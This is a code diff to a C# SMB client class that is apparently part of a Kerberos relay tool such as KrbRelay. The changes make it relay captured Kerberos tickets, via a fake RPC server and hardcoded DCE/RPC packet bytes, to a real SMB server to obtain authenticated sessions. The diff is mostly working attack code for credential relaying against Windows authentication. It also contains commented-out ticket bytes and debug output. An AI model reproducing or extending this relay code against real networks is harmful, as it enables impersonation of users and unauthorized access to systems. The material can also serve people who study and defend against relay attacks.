@@ -6,11 +6,13 @@
  */
 
 using KrbRelay;
+using MimeKit;
 using Org.BouncyCastle.Asn1.Misc;
 using SMBLibrary.NetBios;
 using SMBLibrary.Services;
 using SMBLibrary.SMB2;
 using System;
+using System.Collections;
 using System.Collections.Generic;
 using System.ComponentModel;
 using System.Diagnostics;
@@ -18,6 +20,7 @@ using System.IO;
 using System.Linq;
 using System.Net;
 using System.Net.Sockets;
+using System.Text;
 using System.Threading;
 using Utilities;
 
@@ -41,8 +44,10 @@ namespace SMBLibrary.Client
         private Socket m_clientSocket;
         public Socket currSourceSocket;
         public Socket currDestSocket;
-        public FakeSMBServer curSocketServer;
+        public FakeRPCServer currSocketServer;
         public string ServerType = "";
+        public byte[] CallID = new byte[4];
+        public byte[] AssocGroup= new byte[4];
         private object m_incomingQueueLock = new object();
         private List<SMB2Command> m_incomingQueue = new List<SMB2Command>();
         private EventWaitHandle m_incomingQueueEventHandle = new EventWaitHandle(false, EventResetMode.AutoReset);
@@ -254,12 +259,14 @@ namespace SMBLibrary.Client
             byte[] answer = response.GetBytes();
             int startoff = 72;
 
-            //int pattern = KrbRelay.Helpers.PatternAt(answer, new byte[] { 0xa1, 0x81});
-
+            int pattern = KrbRelay.Helpers.PatternAt(answer, new byte[] { 0xa1, 0x81 });
+            //Console.WriteLine("pattern {0}", pattern);
 
             //byte[] newticket = new byte[answer.Length - pattern];
             //byte[] newticket = new byte[blobl];
             byte[] newticket = answer.Skip(startoff).ToArray();
+
+            //byte [] newticket = new byte []{ 0xA1, 0x81, 0xA6, 0x30, 0x81, 0xA3, 0xA0, 0x03, 0x0A, 0x01, 0x01, 0xA1, 0x0B, 0x06, 0x09, 0x2A, 0x86, 0x48, 0x82, 0xF7, 0x12, 0x01, 0x02, 0x02, 0xA2, 0x81, 0x8E, 0x04, 0x81, 0x8B, 0x6F, 0x81, 0x88, 0x30, 0x81, 0x85, 0xA0, 0x03, 0x02, 0x01, 0x05, 0xA1, 0x03, 0x02, 0x01, 0x0F, 0xA2, 0x79, 0x30, 0x77, 0xA0, 0x03, 0x02, 0x01, 0x12, 0xA2, 0x70, 0x04, 0x6E, 0x9A, 0xC3, 0x30, 0x4C, 0x25, 0xDF, 0x9F, 0x5D, 0x01, 0xD4, 0x01, 0x19, 0x32, 0x10, 0x16, 0xF1, 0x49, 0xA3, 0x10, 0xE9, 0x4D, 0xB3, 0x82, 0x01, 0xE4, 0x14, 0x09, 0x70, 0x01, 0x90, 0x60, 0x10, 0x7E, 0x63, 0xE9, 0x6F, 0xEB, 0x78, 0x13, 0xB2, 0x95, 0x0F, 0xD7, 0x25, 0x1B, 0x2D, 0xD5, 0x5E, 0xE8, 0x1C, 0xB2, 0xB4, 0x0C, 0x54, 0x40, 0x62, 0x92, 0x88, 0x3D, 0x59, 0xB2, 0x56, 0x3C, 0x6E, 0x57, 0x55, 0x1C, 0x53, 0x72, 0xCB, 0x10, 0x3C, 0xEF, 0xC8, 0xE9, 0x06, 0x18, 0x6D, 0xB8, 0x98, 0xAF, 0xAD, 0xDE, 0xFF, 0xB4, 0xD9, 0x35, 0xF3, 0xAE, 0xEC, 0x40, 0x00, 0xA8, 0xE2, 0x3C, 0x30, 0x97, 0xF0, 0x45, 0xDC, 0x6F, 0x29, 0xC4, 0xC6, 0x8E, 0x75, 0x7C, 0x09, 0x6C, 0xE8 };
             //Array.Copy(answer, pattern, newticket, 0, answer.Length - pattern);
 
             //Array.Copy(answer, pattern, newticket, 0, offset+startoff);
@@ -268,12 +275,10 @@ namespace SMBLibrary.Client
 
             if (response != null)
             {
-
                 m_sessionID = response.Header.SessionID;
 
                 if (response.Header.Status == NTStatus.STATUS_SUCCESS)
                 {
-
                     m_isLoggedIn = (response.Header.Status == NTStatus.STATUS_SUCCESS);
 
                     if (m_isLoggedIn)
@@ -290,36 +295,81 @@ namespace SMBLibrary.Client
                     }
                     //Console.WriteLine("m_sessionKey--");
                     //Console.WriteLine(KrbRelay.Helpers.ByteArrayToString(m_sessionKey));
-                    //Console.WriteLine("Smb Login 2");
-                    if(curSocketServer != null)
-                      curSocketServer.CloseConnection(curSocketServer.state);
+
+                    Program.forwdardmode = true;
+                    currSocketServer.CloseConnection(currSocketServer.state);
+                    currSocketServer.state.isRelayed = false;
                     success = true;
-                    return ticket;
-                }
-                else if (response.Header.Status == NTStatus.STATUS_ACCESS_DENIED)
-                {
-                    Console.WriteLine("[*] STATUS_ACCESS_DENIED");
-                    success = false;
                     return ticket;
                 }
                 else if (response.Header.Status == NTStatus.STATUS_MORE_PROCESSING_REQUIRED)
                 {
 
-                    Console.WriteLine("[*] STATUS_MORE_PROCESSING_REQUIRED");
-                    if (ServerType == "DCOM")
+                    Console.WriteLine("[*] SmbClient [{0}] STATUS_MORE_PROCESSING_REQUIRED", currSocketServer.state.SourceSocket.RemoteEndPoint);
+                    byte[] moreArray=null;
+                    byte[] moreArray2;
+                    byte[] moreArray1;
+                    ulong sessid = response.Header.SessionID;
+                    byte[] buffer = new byte[4096];
+                    byte[] b = BitConverter.GetBytes(sessid);
+                    /*
+                    //int pattern = KrbRelay.Helpers.PatternAt(answer, new byte[] { 0x6f, 0x81 });
+
+                    /*
+                    using (FileStream fs = new FileStream("c:\\temp\\more2.bin", FileMode.Open, FileAccess.Read))
                     {
-                        byte[] moreArray;
-                        ulong sessid = response.Header.SessionID;
+                        // Create a buffer to hold the file contents
+                        moreArray = new byte[fs.Length];
 
-                        byte[] b = BitConverter.GetBytes(sessid);
-                        SessionSetupRequest request1 = new SessionSetupRequest();
-                        request1.SecurityMode = SecurityMode.SigningEnabled;
-                        request1.SecurityBuffer = ticket;
+                        // Read the file into the buffer
+                        fs.Read(moreArray, 0, (int)fs.Length);
+                    }*/
+                    //Array.Copy(b, 0, moreArray, 44, 8);
+                    SessionSetupRequest request1 = new SessionSetupRequest();
+                    //request.SecurityMode = 0x0000;
+                    //request1.SecurityMode = SecurityMode.SigningEnabled;
 
-                        moreArray = new byte[] { 0x05, 0x00, 0x0C, 0x07, 0x10, 0x00, 0x00, 0x00, 0xEE, 0x00, 0xAA, 0x00, 0x03, 0x00, 0x00, 0x00, 0xD0, 0x16, 0xD0, 0x16, 0xF6, 0x15, 0x00, 0x00, 0x04, 0x00, 0x31, 0x33, 0x35, 0x00, 0x01, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x04, 0x5D, 0x88, 0x8A, 0xEB, 0x1C, 0xC9, 0x11, 0x9F, 0xE8, 0x08, 0x00, 0x2B, 0x10, 0x48, 0x60, 0x02, 0x00, 0x00, 0x00 };
-                        byte[] buffer = new byte[4096];
-                        int outlen = newticket.Length + moreArray.Length + 8;
-                        byte[] head = new byte[] { 0x09, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };
+                    //request.SecurityMode = 0x0000;
+                    request1.SecurityMode = SecurityMode.SigningEnabled;
+                    request1.SecurityBuffer = ticket;
+                    /*
+                    using (FileStream fs = new FileStream("c:\\temp\\destination.bin", FileMode.Open, FileAccess.Read))
+                    {
+                        // Create a buffer to hold the file contents
+                        moreArray = new byte[fs.Length];
+
+                        // Read the file into the buffer
+                        fs.Read(moreArray, 0, (int)fs.Length);
+                    }*/
+                    moreArray1 = new byte[] { 0x05, 0x00, 0x0c, 0x07, 0x10, 0x00, 0x00, 0x00, 0xEE, 0x00, 0xAA, 0x00, 0x03, 0x00, 0x00, 0x00, 0xD0, 0x16, 0xD0, 0x16, 0xF6, 0x15, 0x00, 0x00, 0x04, 0x00, 0x31, 0x33, 0x35, 0x00, 0x01, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x04, 0x5D, 0x88, 0x8A, 0xEB, 0x1C, 0xC9, 0x11, 0x9F, 0xE8, 0x08, 0x00, 0x2B, 0x10, 0x48, 0x60, 0x02, 0x00, 0x00, 0x00 };
+                    moreArray2 = new byte[] { 0x05, 0x00, 0x0C, 0x07, 0x10, 0x00, 0x00, 0x00, 0x05, 0x01, 0xA9, 0x00, 0x29, 0x00, 0x00, 0x00, 0xD0, 0x16, 0xD0, 0x16, 0xD1, 0x08, 0x00, 0x00, 0x04, 0x00, 0x31, 0x33, 0x35, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x04, 0x5D, 0x88, 0x8A, 0xEB, 0x1C, 0xC9, 0x11, 0x9F, 0xE8, 0x08, 0x00, 0x2B, 0x10, 0x48, 0x60, 0x02, 0x00, 0x00, 0x00, 0x03, 0x00, 0x03, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x09, 0x05, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };
+
+
+                    
+                    int outlen = 0;
+                    //Console.WriteLine("[/] Offsets: {0} {1}", currSocketServer.IOXidResolverOffset, currSocketServer.ISystemActivatorOffset);
+                    byte[] head;
+                    if (currSocketServer.IOXidResolverOffset > 0)
+
+                    {
+                        //Console.WriteLine("[*] SmbClient STATUS_MORE_PROCESSING_REQUIRED  for OXID");
+                        moreArray = new byte[moreArray2.Length];
+                        Array.Copy(moreArray2, moreArray, moreArray2.Length);
+                                              
+
+                    }
+
+                    else
+                    {
+                        
+                        moreArray = new byte[moreArray1.Length];
+                        Array.Copy(moreArray1, moreArray, moreArray1.Length);
+                    }
+                        head = new byte[] { 0x09, 0x05, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };
+
+
+                        outlen = newticket.Length + moreArray.Length + 8;
+                        
                         byte[] outbuffer = new byte[outlen];
                         byte[] b1 = BitConverter.GetBytes(outlen);
 
@@ -328,54 +378,100 @@ namespace SMBLibrary.Client
                         Array.Copy(newticket, 0, outbuffer, moreArray.Length + 8, newticket.Length);
                         Array.Copy(b1, 0, outbuffer, 8, 2);
                         b1 = BitConverter.GetBytes(newticket.Length);
+
+                        //Console.WriteLine("Nweticket len: {0}",(newticket.Length));
                         Array.Copy(b1, 0, outbuffer, 10, 2);
                         outbuffer[12] = Program.CallID[0];
-
-                        Array.Copy(Program.AssocGroup, 0, outbuffer, 20, 4);
+                        outbuffer[12] = CallID[0];
+                    //Console.WriteLine("written: {0}", outlen);
+                    Array.Copy(Program.AssocGroup, 0, outbuffer, 20, 4);
+                        //Console.WriteLine("[*] callid {0} Assocgroup {1}",Program.CallID[0], Convert.ToHexString(Program.AssocGroup));
+                        //Console.WriteLine(Program.HexDump(Program.AssocGroup, 16, 4));
+                        //Console.WriteLine(Program.HexDump(outbuffer,16,24));
+                        //Console.WriteLine(Program.HexDump(outbuffer, 16, 24));
+                        //Console.WriteLine("[/] SmbClient sending to client");
+                        //Console.WriteLine(Program.HexDump(outbuffer, 16));
                         currSourceSocket.Send(outbuffer, 0);
+                        
+                    
+                   // Console.WriteLine("[/] SmbClient  receiving from client");
+                    int l = currSourceSocket.Receive(buffer);                    //Console.WriteLine("rec 2 {0}",l);
+                   
+                    //Console.WriteLine("rec 2 {0}",l);
+                    //Console.WriteLine(Program.HexDump(buffer,16,l));
+                    pattern = KrbRelay.Helpers.PatternAt(buffer, new byte[] { 0xa1, 0x81 });
+                  /*  if (pattern < 0)
+                        return null;*/
 
-                        int l = currDestSocket.Receive(buffer);
-                        int pattern = KrbRelay.Helpers.PatternAt(buffer, new byte[] { 0xa1, 0x81 });
-                        int l3 = l - pattern;
-                        byte[] sendbuffer = new byte[l3];
-                        Array.Copy(buffer, pattern, sendbuffer, 0, l3);
-                        request1.SecurityBuffer = sendbuffer;
-                        TrySendCommand(request1);
+                    int l3 = l - pattern;
+                    
+                    byte[] sendbuffer = new byte[l3];
+                    Array.Copy(buffer, pattern, sendbuffer, 0, l3);
+                    request1.SecurityBuffer = sendbuffer;
+                    //Console.WriteLine("[/] SmbClient  sending to SMB server");
+                    TrySendCommand(request1);
+                    //Console.WriteLine("waiting for: {0}", request1.MessageID);
+                    //Console.WriteLine("[/] SmbClient  waiting from SMB server");
+                    SMB2Command response1 = WaitForCommand(request1.MessageID);
+                    //Console.WriteLine("done sending 2");
 
-                        SMB2Command response1 = WaitForCommand(request1.MessageID);
-                        m_sessionID = response1.Header.SessionID;
+                    /*
+                    byte[] moreArray;
+                    ulong sessid = response.Header.SessionID;
+                    byte[] b =  BitConverter.GetBytes(sessid);
 
-                        if (response1.Header.Status == NTStatus.STATUS_SUCCESS)
+                    
+                    Array.Copy(b, 0, moreArray, 44, 8);
+                    TrySendPacketBytes(m_clientSocket, moreArray);
+                    */
+                    //Console.WriteLine("[*] SmbClient [{0}]  Header Status {1}", currSocketServer.state.SourceSocket.RemoteEndPoint, response1.Header.Status);
+                    Console.WriteLine("[*] Header Status {0}", response1.Header.Status);
+                    m_sessionID = response1.Header.SessionID;
+
+                    if (response1.Header.Status == NTStatus.STATUS_SUCCESS)
+                    {
+                        m_isLoggedIn = (response1.Header.Status == NTStatus.STATUS_SUCCESS);
+
+                        if (m_isLoggedIn)
                         {
-                            m_isLoggedIn = (response1.Header.Status == NTStatus.STATUS_SUCCESS);
-
-                            if (m_isLoggedIn)
+                            m_sessionKey = new byte[16];
+                            new Random().NextBytes(m_sessionKey);
+                            m_signingKey = SMB2Cryptography.GenerateSigningKey(m_sessionKey, m_dialect, null);
+                            if (m_dialect == SMB2Dialect.SMB300)
                             {
-                                m_sessionKey = new byte[16];
-                                new Random().NextBytes(m_sessionKey);
-                                m_signingKey = SMB2Cryptography.GenerateSigningKey(m_sessionKey, m_dialect, null);
-                                if (m_dialect == SMB2Dialect.SMB300)
-                                {
-                                    m_encryptSessionData = (((SessionSetupResponse)response).SessionFlags & SessionFlags.EncryptData) > 0;
-                                    m_encryptionKey = SMB2Cryptography.GenerateClientEncryptionKey(m_sessionKey, SMB2Dialect.SMB300, null);
-                                    m_decryptionKey = SMB2Cryptography.GenerateClientDecryptionKey(m_sessionKey, SMB2Dialect.SMB300, null);
-                                }
+                                m_encryptSessionData = (((SessionSetupResponse)response).SessionFlags & SessionFlags.EncryptData) > 0;
+                                m_encryptionKey = SMB2Cryptography.GenerateClientEncryptionKey(m_sessionKey, SMB2Dialect.SMB300, null);
+                                m_decryptionKey = SMB2Cryptography.GenerateClientDecryptionKey(m_sessionKey, SMB2Dialect.SMB300, null);
                             }
-
-                            success = true;
                         }
 
-
-                        return sendbuffer;
+                        success = true;
                     }
+                    Program.forwdardmode = true;
+                    //if(currSocketServer.ISystemActivatorOffset > -1 || currSocketServer.IOXidResolverOffset > -1)
+                    { 
+                    currSocketServer.CloseConnection(currSocketServer.state);
+                    
+                    }
+                    
+                    currSocketServer.state.isRelayed = false;
+                    return sendbuffer;
                 }
                 else
                 {
-                    throw new Win32Exception((int)response.Header.Status);
+                    Console.WriteLine("[-] SmbClient [{0}]  Error: {1}", currSocketServer.state.SourceSocket.RemoteEndPoint,response.Header.Status);
+                    //throw new Win32Exception((int)response.Header.Status);
                 }
             }
+
+            currSocketServer.state.isRelayed = false;
+            //Program.forwdardmode = true;
+            //if(currSocketServer.EPMOffset ==-1)
+              //  currSocketServer.CloseConnection(currSocketServer.state);
+            
             return ticket;
         }
+        
 
         public NTStatus Logoff()
         {
